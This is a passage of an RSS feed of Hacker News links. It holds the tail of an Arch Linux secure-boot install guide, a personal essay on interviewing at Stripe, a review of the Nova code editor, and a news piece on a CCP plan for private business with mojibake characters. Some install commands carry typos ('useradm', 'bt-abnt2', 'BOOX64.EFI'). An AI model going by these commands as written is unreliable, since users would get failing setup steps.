<p><strong>Step 09</strong>: Configure the rest of the system. Remember, this is just an overview of the Arch Linux installation and the focus here is on the secureboot aspect of this setup. In this step we will configure locale, localtime, keymap, hostname and user. I’m configuring a setup for a Brazilian Portuguese user so, change this info to reflect your language.</p>
<pre><code>ln -s /usr/share/zoneinfo/America/Sao_Paulo /etc/localtime
hwclock --systohc
echo LANG=pt_BR.UTF-8 &gt; /etc/locale.conf
echo KEYMAP=bt-abnt2 &gt; /etc/vconsole.conf
echo hostname_i_want &gt; /etc/hostname
</code></pre>
<p>Uncomment the <code>pt_BR.UTF-8 UTF-8</code> line inside <code>/etc/locale.gen</code> and generate this localization with:</p>
<pre><code>locale-gen
</code></pre>
<p>Create a password for root, and the basic info for your user(change <code>myuser</code> to your login):</p>
<pre><code>passwd
useradm -m -g users -G wheel myuser
passwd myuser
</code></pre>
<p><strong>Step 10</strong>: Edit your <code>mkinitcpio.conf</code> and include the <code>HOOKS</code> <code>keyboard</code>, <code>keymap</code>, <code>lvm2</code> and <code>resume</code>. Include <code>ext4</code> on <code>MODULES</code> and change <code>COMPRESSION</code> to <code>cat</code>. You can check my config file <a href="https://gitlab.com/nwildner/dotfiles/-/blob/master/etc/mkinitcpio.conf">here</a>. Recreate your initd:</p>
<pre><code>mkinitcpio -p linux
</code></pre>
<p>You may have noticed the <code>i915</code> module on my <code>mkinitcpio.conf</code>. That’s how you avoid video flickering during the boot process if you are a user of an Intel Integrated graphics card.</p>
<p><strong>Step 11</strong>: Lets check if your motherboard is able to handle EFI entries using the following command:</p>
<pre><code>bootctl status| grep -i "sets"
       ✓ Boot loader sets ESP partition information
</code></pre>
<p>If this option is marked with <code>✓</code> you will be able to set boot information on your motherboard directly. Otherwise, you’ll have to rely on a bootloader like <code>systemd-boot</code>. You could obviously use the default EFI fallback option (<code>EFI/BOOT/BOOX64.EFI</code>) but the sofware we will use to automatically create …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nwildner.com/posts/2020-07-04-secure-your-boot-process/">https://nwildner.com/posts/2020-07-04-secure-your-boot-process/</a></em></p>]]>
            </description>
            <link>https://nwildner.com/posts/2020-07-04-secure-your-boot-process/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24511852</guid>
            <pubDate>Fri, 18 Sep 2020 01:00:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Experience Interviewing with Stripe]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24511838">thread link</a>) | @lpolovets
<br/>
September 17, 2020 | https://daeyoungchoi.com/stripe-interview/ | <a href="https://web.archive.org/web/*/https://daeyoungchoi.com/stripe-interview/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	
<p>Interviewing for a job often is a daunting experience. It may commonly be described as a two-way selection process, one in which the candidate is evaluating the company as much as the company is the candidate, but the sober truth is that outside of the most highly sought-after segments of the talent pool, the balance of power resides squarely with the hiring company and the candidate has little leverage until the moment a job offer is presented. This seemingly is especially true in Silicon Valley, where each job opening routinely attracts hundreds of applicants and it is not uncommon that the candidate simply never hears back from the company in the case the interview is deemed unsuccessful at any point along the process, without even a notice of rejection, let alone being provided an explanation or feedback of any kind. Basic decency and decorum can seem to fly out the window once the company makes the determination you are “not a fit,” which effectively translates to “henceforth a waste of time,” simply an undesired byproduct of an essential process, to be discarded as quickly as possible.</p>



<p>But every once in a while, as is the case with life in general, an exception comes along that runs against the grain of your learned expectations. It shows you the extraordinary does exist and offers a reminder that much of what happens in this world lies on a distribution, despite the seeming tyranny of what occupy the regions of central tendency. While it won’t negate the broadly observed norms, the reminder that excellence exists in almost all domains of human activity sometimes is enough to sustain one in a journey that is full of pitfalls and trials, providing the inspiration that helps keep alive hopes and aspirations even when the objective and dispassionate prognosis appears far from welcoming. Interviewing with Stripe, the payment startup, for me, was such an example.</p>



<p>My very first interview with Stripe started off quite inauspiciously. It was a phone interview with the recruiter, and after spending some time to explore and discuss both my background and that of the job, he let me know that my skill set probably was not as good a match for what the hiring team was looking for as initially thought. In retrospect that sort of upfront candor might have been an early indication of the caliber of the organization that was to be revealed more fully later on. But the remarkable thing that happened after he uttered that assessment was that he wanted to refer me to another recruiter, for a different role which he thought presented a better match. This was something that quite literally had never happened in my experience, admittedly a small sample as it may be – a recruiter that not only was well-versed enough in another position for which he was not recruiting, was empowered enough by the organization to make that kind of an autonomous referral decision without consultation, but also, probably most impressively, cared enough to take on such an initiative when I was deemed no longer useful for his immediate need, which was to fill the position at hand.</p>



<p>The subsequent interviews, for the new role, went more smoothly, uneventfully in the best sense. Over the course of the ensuing few weeks, in succession, I had a phone call with the new recruiter, a Zoom video call with the head of the business unit for the role (who was based overseas), a writing assignment, and in-person coffee shop chats in San Francisco with the said head of the business unit who happened to be in town that week and also with the hiring manager. All of that led to culminate in an on-site round of interviews with 7 individuals that lasted over 4 hours in January of this year at the San Francisco headquarters of Stripe.</p>



<p>In retrospect, it is clear I did not perform as well on the on-site interviews as I should have. What was unique about Stripe was the interview questions were actually provided in advance – the recruiter arranged a call with me prior to the scheduled date to go over the questions one by one. Gripped by the notion, somehow, that interviews are just conversations, however, I did not spend a lot of time preparing specific answers for those questions. Looking back, I now think a big part of the reason why was hubris; I have a tendency to think I enjoy all conversations, and proceeded to draw the conclusion in my mind that conversations I enjoy in an interview setting must be good interviews. The mere fact that I was ready to enjoy the interviews, in their natural, unscripted, conversational formulation, was, in a way, enough preparation. But once the on-site interviews began it became apparent the interviewers were pressing for a higher level of specificity in the answers than I was prepared to give in the courses of casual conversations. I could feel the inadequacy of my answers resulting from the lack of deeper considerations given them in advance, and I simply was not good enough to get to the level of detailed thoughtfulness on the spot. As I was ushered out of the building after the interviews concluded, I recall feeling a sense of regretful uneasiness creeping in. Almost compulsively, I remained hopeful, but far from confident. And surely enough, a few days later I was informed that I didn’t get the job. </p>



<p>I was devastated, but this is the point from which I was led to Stripe revealing itself to be a truly unique, unconventional company in the most unexpectedly wonderful ways. First, the recruiter offered to schedule a call so we could review the decision. I was pleasantly surprised to be given such an unusual opportunity, so I took him up on it. During the call he relayed some useful feedback, though it is clear in retrospect that I got too excited to be on such a call and spent way more time talking than listening to what he had to say. But importantly, the conversation helped me come to a realization, in concrete ways, that I was a much worse interviewee than had previously believed myself to be. It prompted me to ex-examine my natural tendencies in the ways I think, talk, and engage with others in conversations. When I shared the revelation with my wife, she was more than happy to supply additional pointers in areas of my failing.</p>



<p>The fact that the recruiter, and by extension the company, was willing to engage with and spend the time and effort on someone deemed to be “not wanted” was an enormous departure from everything I had experienced previously. Frankly, it was the kind of thoughtfulness and generosity of goodwill that I never expected any corporate entity to possess or display. I knew I had been rejected, but now I wanted Stripe even more, and I couldn’t let myself just give up. So I did something quite silly: I sent an email to the CEO. Fortunately Patrick Collison, Stripe’s CEO, lists his email address on his personal website. But I had no idea if the email would actually reach him, or if he would read it if it got to him, or if he would respond in any way. The overwhelmingly realistic outcome was that nothing would happen, and I knew it. It was a desperation move, one you are able to make only because you have nothing to lose.</p>



<p>Then, I got an email from the recruiter. He asked if I wanted to speak with the company’s chief risk officer – the job I interviewed for was a risk function – for reasons that were not entirely clear. He mentioned I might want “a bit more closure,” but I didn’t want closure; if anything, I wanted to keep the door ajar as much and as long as possible. He also said that the meeting was optional, with “no pressure.” Perplexed yet intrigued, I took up the opportunity to speak with the executive. She began the call with something to the effect of “I know you reached out to Patrick.” I had reached out to everyone I had interviewed with to solicit feedback, and since the name “Patrick” didn’t register right away I processed it to mean one of the interviewers. But about 5 seconds later I realized there was no one named Patrick that I had met, and then it hit me that it must be Patrick Collison, the CEO. My email to him was why this call was happening, which the chief risk officer confirmed when I asked her in disbelief. I was stunned. Having taken place almost a half year ago, much of the details of the call is a blur. But I recall distinctly her asking why Stripe should hire someone like myself. Most improbably, it seemed, this might be a second chance.</p>



<p>I had written to Patrick the CEO with a proposition: I offered myself to be a counterfactual data point in an evaluation of Stripe’s hiring process, after learning that Stripe’s credit card fraud detection system lets through some transactions which its algorithms flag as likely frauds in order to determine whether they turn out to be true positives or false positives – thereby evaluating the algorithms themselves – in a process called “counterfactual evaluation.” When the chief risk officer asked why I should be hired, I reiterated that proposition: the case I was making was not about my merits, but the willingness on Stripe’s part to apply counterfactual evaluation to its hiring process, to determine whether I was a false positive (incorrectly rejected) or a true positive (truly no good) by letting me join Stripe, without a bias to either outcome. I couldn’t tell if I was making any headway with the argument, but we soon ran out of time and she had to go to another meeting.</p>



<p>In the end, the outcome of my interviews did not change and I remain not an employee of Stripe. But out of all the job interview experiences I’ve had in my life, the one with Stripe stands out as singularly remarkable. When I shared my story with a friend she was so impressed that even though she wasn’t looking for a new job, she said she still might apply to Stripe just for the experience. Today Stripe has earned a reputation as one of the best embodiments of the ideals of Silicon Valley – a place of inventive and ambitious companies that not only come up …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://daeyoungchoi.com/stripe-interview/">https://daeyoungchoi.com/stripe-interview/</a></em></p>]]>
            </description>
            <link>https://daeyoungchoi.com/stripe-interview/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24511838</guid>
            <pubDate>Fri, 18 Sep 2020 00:57:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Panic's Nova text editor (a review)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24511824">thread link</a>) | @zdw
<br/>
September 17, 2020 | https://tracks.ranea.org/post/629525278016798720/panics-nova-text-editor-a-review | <a href="https://web.archive.org/web/*/https://tracks.ranea.org/post/629525278016798720/panics-nova-text-editor-a-review">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fpanic.com&amp;t=Mjk1NThjNmYxMjlkOTE5ZTBhOWEzMDhhYWI0Y2FmMDk0NDkwNDYyMixnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600619095">Panic</a>, the long-established makers of Mac utility software, seems fully aware that introducing a new, commercial code editor in 2020 is a quixotic proposition. Is there enough of an advantage to a native editor over both old school cross-platform editors like Emacs and explosively popular new editors like <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fcode.visualstudio.com&amp;t=NGRiY2I1OTU4OTEwNTIwNjY1MmYzZmJlNjg0MjIwYTk4MmZjNmYzNixnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600619095">Visual Studio Code</a> to persuade people to switch?</p><p>I’m an unusual case as far as text editor users go: my primary job is technical writing, and the last three jobs that I’ve worked at have a “docs as code” approach, where we write documentation in Markdown and manage it under version control just like source code. The editor that works best for me in tech writing is the venerable <a href="https://t.umblr.com/redirect?z=http%3A%2F%2Fwww.barebones.com%2Fproducts%2Fbbedit%2Findex.html&amp;t=ZjI1ODI2MTAwYzhjZTdiMmVmZTcyNzI4MTQ2ZjNlYjNkYTgzYjY0YSxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600619095">BBEdit</a>. When it comes to editing <em>code,</em> though, BBEdit lags behind. My suspicion is that BBEdit’s lack of an integrated package manager has hurt it here. Also, BBEdit’s language modules don’t support extending one another, making it effectively impossible to do full highlighting for a templating language like <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Freactjs.org%2Fdocs%2Fintroducing-jsx.html&amp;t=NTIwNTMxNmU1ODUzNGM5YzMxNDQ0ODgyOTE4OGQ1NjRmYzExOGEwZixnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600619095">JSX</a> or <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fpalletsprojects.com%2Fp%2Fjinja%2F&amp;t=YzhiY2M4ZmZlYzJhYTM2YjM2OWMzZTdjMWNhYmM3NjE2MWM3NjAzYSxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600619095">Jinja</a>.</p><p>When I was a web programmer, I was one of many who moved to <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fmacromates.com%2F&amp;t=NTI2NDUxZjE1ZDc4ZDljYTAwZDQyZDNkMDMxYjFiNGYyNmYwODNkZCxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600619095">TextMate</a>, and used it for everything for a while. When the Godot-like wait for TextMate 2.0 became unbearable, I wandered the text editing wilderness, eventually splitting my loyalties between BBEdit, <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.sublimetext.com%2F&amp;t=OWJlNTA5MTU0NjQ2NGZlYjVlNzYxNDIyOTg2NzhlMWRiYzZjMzZiZCxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600619095">Sublime Text</a>, and more recently VS Code. At this point, I suspect nothing will pull me away from BBEdit for technical writing, but for programming I’m open to persuasion.</p><h2 id="so-meet-nova">So: meet Nova.</h2><figure data-orig-height="2096" data-orig-width="2192" data-orig-src="https://micro.coyotetracks.org/uploads/2020/0d33432bcb.png"><img src="https://64.media.tumblr.com/71bc06b690da9776b15d551318a514f0/d722421a61f4e9d6-93/s1280x1920/fb42d548cc1d17dee9a5c099241dfa4bbf6e83e0.png" alt="A screenshot of Nova's main window, showing its sidebar and a Ruby file." title="nova-main-window-2x.png" width="1096" height="1048" data-orig-height="2096" data-orig-width="2192" data-orig-src="https://micro.coyotetracks.org/uploads/2020/0d33432bcb.png"></figure><p>I’ve been using Nova off and on in beta for months. I’ve reported some bugs, although I may mention a couple here that I didn’t catch until after 1.0’s release. And, I’m going to compare it to the GUI editors that I’ve been using recently: BBEdit, Sublime Text, and VS Code.</p><p>Nova is a <em>pretty</em> editor, as far as such things go, and with files of relatively reasonable size it’s fast. With stupid huge files its performance drops noticeably, though. This isn’t just the ridiculous 109MB, nearly 450,000-line SQL file I threw at it once, it’s also with a merely 2MB, 50,000-line SQL file, and Nova’s offer to turn off syntax highlighting in both files didn’t help it much. This may sound like a silly test, but in my day job I’m occasionally stuck editing an 80,000-line JSON file by hand (don’t ask). This is something BBEdit and VS Code can do without complaint. Panic wrote their own text editing engine for Nova, which is brave, but it needs more tuning for pathological cases like these. They may not come up often, but almost every programmer has <em>one</em> stupid huge file to deal with.</p><p>Nova has an integrated terminal <em>and</em> an integrated SSH client, and even an integrated file transfer system based on Panic’s <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.panic.com%2Ftransmit%2F&amp;t=ZjIxNGMxZTM4Y2RlNWU3NmY3NzA4YWFkNTlhYzVhM2IyYTRkMDllYixnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600619095">Transmit</a>. In fact, if you have Transmit and use <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fpanic.com%2Fsync%2F&amp;t=ZDIzNDc1MWNmOWYwYmVjNzgzMmUyZWQ0ZWQxNTZmODdhMTg3OTEwMyxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600619095">Panic Sync</a>, it knows all of those servers out of the box. Nova has a <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Flibrary.panic.com%2Fnova%2Frun-tasks%2F&amp;t=NTRhNWJhM2YzNGMwNDVlOGQ5Mzg4NmU5ZDFlMjExYTUzMzBiNjY2ZCxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600619095">task workflow system</a> for automating building and running. You can associated servers, tasks, and more with individual projects; Nova’s project settings are considerably more comprehensive than I’ve seen in other editors. You can even set up <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Flibrary.panic.com%2Fnova%2Fremote-tasks%2F&amp;t=MDJmYzViNDgwYWNlMjdhYTFmNmIzMjIxMzFiZmU2YzllYTE2Mjc0OCxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600619095">remote tasks</a>. Nova has a serviceable Git client built in, too. Like VS Code, Nova uses JavaScript for its extension API, and it has built-in <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fmicrosoft.github.io%2Flanguage-server-protocol%2F&amp;t=ZTFmZTEyNzZjNzY5ZjFlZTA5Y2U3MTBlYzliZWE1NDViOTQ3NmJlNyxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600619095">Language Server Protocol</a> support—it’s a superbly solid foundation.</p><p>Beyond that, some smaller features have become table stakes for modern GUI editors, and Nova handles them with aplomb. “Open Quickly” can jump to any file in the open project, as well as search by symbols or just symbols in currently open files; it has a command palette; you can comprehensively edit keybindings. It has multiple cursor support for those of us who like that, and a “mini map” view for those of you who like that, although know that you are wrong. Nova’s selection features include “Select all in scope” and “Select all between brackets,” a command I often use in BBEdit and miss dearly in Code. (Both Nova and BBEdit select between brackets and braces, although BBEdit also selects between parentheses.) This effectively becomes “Select between tags” in HTML, a nice touch. There are a few other commands like “Select all in function” and “Select all in scope” that I didn’t have any luck in making work at all; a little more documentation would be nice.</p><p>That’s worth an aside. Panic has created a “library” of tech note-style articles about Nova sorted by publication date rather than an actual manual, and it’s not always easy to find the information you want in it. I know this is just what a technical writer would say, but I’d dearly like to see a human-organized table of contents starting with the editor basics and moving to advanced topics like version control, server publishing and extension authoring.</p><h3 id="the-zen-of-language-servers">The Zen of Language Servers</h3><p>A lot of Visual Studio Code’s smarts depend on the implementation of a “language server” behind the scenes: language servers offer almost spookily intelligent completion. For instance, take this PHP snippet:</p><pre><code>if ($allowed) {
    $response = new Response(405);
    $response-&gt;
</code></pre><p>If you have the <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fgithub.com%2Fbmewburn%2Fvscode-intelephense&amp;t=ZWJmNWY3NDRkZWY0ODJlNDBmYzAxYWU3MTEzNGI3MDQ0NmU2ZWY5MyxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600619095">Intelephense</a> PHP language server plugin, Code understands that <code>$response</code> is an instance of <code>Response</code> and, after you type the <code>&gt;</code> above, offers completions of method names from the <code>Response</code> class.</p><p>Right now, Nova’s mostly limited to the language servers Panic provides, and they’re… not always so smart. In that snippet above, Nova starts by offering completions of, apparently, <em>everything</em> in the open project, starting with the variables. If I type “s,” it narrows things down to methods that begin with “s,” but it’s <em>all</em> methods that start with “s” rather than just the methods from <code>Response</code>. The “Jump to Definition” command shows a similar lack of context; if I highlight a method name that’s defined in multiple places, Nova shows me a popup menu and prompts me to choose which one to jump to, rather than introspecting the code to make that decision itself.</p><p>But, this is a solvable problem: there’s (I think) no reason someone couldn’t write an Inteliphense plugin for Nova. If Nova’s ecosystem takes off, it could be pretty formidable pretty quickly.</p><h2 id="walk-like-a-mac">Walk like a Mac</h2><p>Even so, LSP support isn’t Panic’s biggest selling point. Unlike Sublime Text or VS Code, Nova isn’t cross-platform: it’s a Mac-only program written to core platform APIs. Is that still a huge draw in 2020? (Is it instead a drawback?)</p><p>You can definitely see a difference between Nova and BBEdit on one side and Sublime and Code on the other in terms of resource usage. With the two Ruby files shown in the screenshot above loaded, I get:</p><ul><li>VS Code: 355 MB, 6 processes</li><li>Sublime Text: 338 MB, 2 processes</li><li>Nova: 101 MB, 2 processes</li><li>BBEdit: 97 MB, 1 process</li></ul><p>Code is an Electron-based program, although Microsoft famously puts a lot of effort into making it not feel like the black hole a lot of Electron-based apps are. Sublime uses its own proprietary cross-platform framework. In fairness, while us nerds like to harp on research usage a lot, if your computer’s got 16G or more of RAM in it, this probably isn’t a big deal.</p><p>You notice Nova’s essential Mac-ness in other ways. Its preference pane is, like BBEdit’s, an actual preference pane, instead of opening in another tab like Code or just opening a JSON file in a new tab (!) like Sublime. And while all editors better have first-class keyboard support—and Nova does—a good Mac editor should have first-class <em>mouse</em> support, too, and it does. You notice that in the drag-and-drop support for creating new tabs and splits. Nova’s sidebar is also highly customizable, possibly more so than any editor I’ve regularly used. (Yes, Emacs fans, I know you can write all of Nova in Lisp if you want. When one of you does that, please get back to me.)</p><p>Unlike BBEdit, though, Nova doesn’t have a Mac-like title bar, or a Mac-like outline view of the project files, or Mac-like tabs. (Well, BBEdit doesn’t have tabs at all, which turns out to be a great UI decision once you have a dozen or more files open, but never mind.) This isn’t necessarily bad; people often say BBEdit “looks old,” and it’s hard not to suspect that what people mean by that—whether or not they know it—is that it looks like the long-established Mac program it is. Nova is relying less on “we have a Mac UI and the other guys don’t” than on “we have Panic’s designers and the other guys don’t.” Make no mistake, having Panic’s designers counts for a lot.</p><p>What may be more disappointing to old school Mac nerds is AppleScript support: none whatsoever. It doesn’t even have a vestigial script dictionary. Again, this may not be something most people care much about; personally, I <em>hate</em> having to write AppleScript. But I love being <em>able</em> to write AppleScript. BBEdit’s extensive scriptability is one of its hidden strengths. Nova’s Node-based JavaScript engine is probably more powerful for its own extensions and certainly more accessible to anyone under the age of 50, but it may be hard to call it from external programs.</p><h2 id="so-is-it-worth-it">So is it worth it?</h2><p>That probably depends on where you’re coming from.</p><p>If you loved—or still use—Panic’s older editor, Coda, this is a no-brainer upgrade. If you used <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.espressoapp.com&amp;t=YzdkM2M3ZDc3NmQ1MmFjNDM4NTVmZTIxNzQyZjcwZDJkMGM5M2MxMyxnN3NFcFBjMw%3D%3D&amp;b=t%3AwL7qozbvOFBUrYHD0Ja1WA&amp;p=https%3A%2F%2Ftracks.ranea.org%2Fpost%2F629525278016798720%2Fpanics-nova-text-editor-a-review&amp;m=1&amp;ts=1600619095">Espresso</a>, a Coda-ish editor that always seemed to be on the verge of greatness without ever reaching it, Nova may also be a no-brainer for you.</p><p>If you’re a fan of Sublime Text, BBEdit, TextMate, or another editor that doesn’t have native Language Server Protocol support, you should definitely <em>try</em> Nova. Sublime and TextMate have more plugins (especially Sublime), but many extensions seem to be languishing (especially TextMate). BBEdit never had a great extension ecosystem to start with. All of these editors have strengths Nova doesn’t, but the reverse is also true, and Nova may catch up.</p><p>If you’re an Emacs or Vim power user, we both know you’re just reading this out of academic interest and you’re not going to switch. C’mon.</p><p>If you use Visual Studio Code, though, it’s way tougher to make the case for Nova. Code has a <em>vastly</em> larger extension library. It has the best support for LSP of any editor out there (LSP was developed <em>for</em> Code). Despite being …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://tracks.ranea.org/post/629525278016798720/panics-nova-text-editor-a-review">https://tracks.ranea.org/post/629525278016798720/panics-nova-text-editor-a-review</a></em></p>]]>
            </description>
            <link>https://tracks.ranea.org/post/629525278016798720/panics-nova-text-editor-a-review</link>
            <guid isPermaLink="false">hacker-news-small-sites-24511824</guid>
            <pubDate>Fri, 18 Sep 2020 00:54:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CCP announces plan to take control of China's private sector]]>
            </title>
            <description>
<![CDATA[
Score 28 | Comments 4 (<a href="https://news.ycombinator.com/item?id=24511672">thread link</a>) | @apsec112
<br/>
September 17, 2020 | https://www.asiatimesfinancial.com/ccp-announces-plan-to-take-control-of-chinas-private-sector | <a href="https://web.archive.org/web/*/https://www.asiatimesfinancial.com/ccp-announces-plan-to-take-control-of-chinas-private-sector">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        
        
        
      
        <h3>(ATF)Â&nbsp;Chinese President Xi Jinping and the Communist Party's Central Committee have laid out a plan for a â€˜new eraâ€™ in which the party has better control over private business in China. </h3><p><a href="http://www.xinhuanet.com/fortune/2020-09/15/c_1126497384.htm">The plan</a> was detailed in a 5,000-word statement â€“ and all regions and departments in the country have been told to follow the new guidelines.</p><p><span>This was the top story on Wednesday's CCTV Evening News â€“ how the president had issued â€œimportant instructionsâ€�.</span></p><p><span>It had a long-winded title: "Opinion on Strengthening the United Front Work of the Private Economy in the New Era".</span></p><p><span>The ultimate goal is for the party to have ideological leadership of private enterprise.</span></p><p><span>The statement seeks to improve CCP control over private enterprise and entrepreneurs through United Front Work â€œto better focus the wisdom and strengthen of the private businesspeople on the goal and mission to realise the great rejuvenation of the Chinese nation.â€�</span></p><p><span>Xi's instructions were issued ahead of a conference today on this very topic.Â&nbsp;</span>The party wants to see a "united front" between private enterprise and government business.</p><h3><figure><iframe frameborder="0" scrolling="no" allow="accelerometer; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" mozallowfullscreen="" webkitallowfullscreen="" oallowfullscreen="" msallowfullscreen="" allowtransparency="true" src="//player.vimeo.com/video/459459469"></iframe></figure>100 ways to rein in the private sector</h3><p>Since the 18th National Congress in May, members of the party's Central Committee and Comrade Xi have proposed a series of new concepts and strategies, and adopted a series of major measures to guide and promote private economic 'united front' work. They say these moves have achieved "remarkable results". </p><p>As Chinaâ€™s private economy has grown and diversified, the statement says "these measures will bring about a great rejuvenation of the Chinese nation under Xi Jinping thought".</p><p>Overall, there are more than 100 measures, including guidance on selection of personnel to implement the measures. </p><p>"We must also see that socialism with Chinese characteristics has entered a new era, [as] the scale of the private economy has continued to expand, risks and challenges have increased significantly, the values and interests of the private economy have become increasingly diverse, and the united front work of the private economy is facing new situations and tasks," the statement says.</p><p>"In order to thoroughly implement the major decisions and deployments of the Party Central Committee, to further strengthen the Party's leadership of the private economic united front work, and to better integrate the wisdom and strength of private economic personnel to the goal and task of achieving the great rejuvenation of the Chinese nation, the following opinions are hereby offered."</p><p>The primary stated significance of the measures is â€œenhancement of the partyâ€™s leadership over the private economy â€“ private economic figures are to be more closely united around the party.â€�</p><h3>More CCP involvement in business</h3><p>This is quite a turnaround. Previously, private business was not considered very worthy for party membership or influence, but it has gradually entered the heart of the regime.</p><p>According to the new provisions, private firms will need a certain amount of CCP registered employees, which is already a long-term practise in large private firms but not smaller ones. </p><p>These cadres will make sure businesses follow the guiding ideologyÂ&nbsp;â€œGuided by Xi Jinpingâ€™s Thought on Socialism with Chinese Characteristics for a New Era.â€� </p><p>They will also guide private business people to enhance the latest CCP catchphrases â€“ â€œfour consciousnessesâ€�, strengthen the â€œfour self-confidencesâ€�, and achieve the â€œtwo safeguards.â€�</p><p>Duties of cadres will include the duties of strengthening ideological guidance,Â&nbsp;guiding private economic figures to increase their awareness of self-discipline, build a strong line of ideological and moral defence, strictly regulate their own words and deeds, cultivate a healthy lifestyle, and create a good public image.Â&nbsp;</p><p>They will also need to continuously improve law abidance and moral standards of private citizens.Â&nbsp;</p><p>Communication channels will be set up between private business and the party to report back on progress and other matters.</p>
      
      
        <p>Tags:</p>
      
      </article></div>]]>
            </description>
            <link>https://www.asiatimesfinancial.com/ccp-announces-plan-to-take-control-of-chinas-private-sector</link>
            <guid isPermaLink="false">hacker-news-small-sites-24511672</guid>
            <pubDate>Fri, 18 Sep 2020 00:33:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The End of the Arab-Israeli Conflict]]>
            </title>
            <description>
<![CDATA[
Score 29 | Comments 7 (<a href="https://news.ycombinator.com/item?id=24511291">thread link</a>) | @brandonlc
<br/>
September 17, 2020 | https://ottomansandzionists.com/2020/09/17/the-end-of-the-arab-israeli-conflict/ | <a href="https://web.archive.org/web/*/https://ottomansandzionists.com/2020/09/17/the-end-of-the-arab-israeli-conflict/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

					
						<div>

							
